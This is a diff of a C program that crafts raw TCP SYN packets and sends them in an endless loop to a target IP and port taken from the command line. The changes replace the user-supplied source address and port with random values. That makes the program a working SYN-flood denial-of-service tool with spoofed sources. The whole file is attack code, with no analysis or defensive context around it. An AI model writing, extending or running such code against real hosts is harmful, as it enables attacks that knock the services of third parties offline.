@@ -4,8 +4,11 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <signal.h>
 #include <string.h>
 #include "headers.h"
+
+int g_sockfd;
 
 /**
  * 计算校验和
@@ -36,7 +39,7 @@ uint16_t cksum(uint16_t *p, int len)
     return (~(uint16_t) cksum);
 }
 
-void make_syn_packet(char *packet, uint32_t saddr, uint32_t daddr, uint16_t sport, uint16_t dport)
+void make_syn_packet(char *packet, uint32_t daddr, uint16_t dport)
 {
     struct ip_header ih;
     struct tcp_header th;
@@ -51,10 +54,10 @@ void make_syn_packet(char *packet, uint32_t saddr, uint32_t daddr, uint16_t spor
     ih.ttl = 128;
     ih.proto = IPPROTO_TCP;
     ih.cksum = 0;
-    ih.saddr = htonl(saddr);
+    ih.saddr = rand();
     ih.daddr = htonl(daddr);
 
-    th.sport = htons(sport);
+    th.sport = rand();
     th.dport = htons(dport);
     th.seq = rand();
     th.ack = 0;
@@ -78,36 +81,40 @@ void make_syn_packet(char *packet, uint32_t saddr, uint32_t daddr, uint16_t spor
     memcpy(packet + sizeof(ih), &th, sizeof(th));
 }
 
+void prg_exit()
+{
+    printf("program exiting...\n");
+    close(g_sockfd);
+    exit(1);
+}
+
 int main(int argc, char **argv)
 {
-    int sockfd;
     struct sockaddr_in addr;
-    uint32_t saddr, daddr;
-    uint16_t sport, dport;
+    uint32_t daddr;
+    uint16_t dport;
     char packet[sizeof(struct ip_header) + sizeof(struct tcp_header)];
 
-    if (argc != 5)
+    if (argc != 3)
     {
-        printf("usage: %s <src-ip> <src-port> <dst-ip> <dst-port>\n", argv[0]);
+        printf("usage: %s <dst-ip> <dst-port>\n", argv[0]);
         return 1;
     }
-    saddr=inet_addr(argv[1]);
-    daddr = inet_addr(argv[3]);
-    sport = atoi(argv[2]);
-    dport=atoi(argv[4]);
+    daddr = inet_addr(argv[1]);
+    dport = atoi(argv[2]);
 
-    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sockfd < 0)
+    g_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (g_sockfd < 0)
     {
         perror("socket");
         exit(1);
     }
 
     const int on = 1;
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
+    if (setsockopt(g_sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
     {
         perror("setsockopt");
-        close(sockfd);
+        close(g_sockfd);
         exit(1);
     }
 
@@ -116,15 +123,17 @@ int main(int argc, char **argv)
     addr.sin_addr.s_addr = daddr;
     addr.sin_port = htons(dport);
 
+    signal(SIGINT, prg_exit);
+    printf("sending TCP-SYN packet...\n");
     for (;;)
     {
         usleep(1000);
-        make_syn_packet(packet, htonl(saddr), htonl(daddr), sport, dport);
+        make_syn_packet(packet, htonl(daddr), dport);
 
-        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+        if (sendto(g_sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &addr, sizeof(addr)) < 0)
         {
             perror("sendto");
-            close(sockfd);
+            close(g_sockfd);
             exit(1);
         }
     }
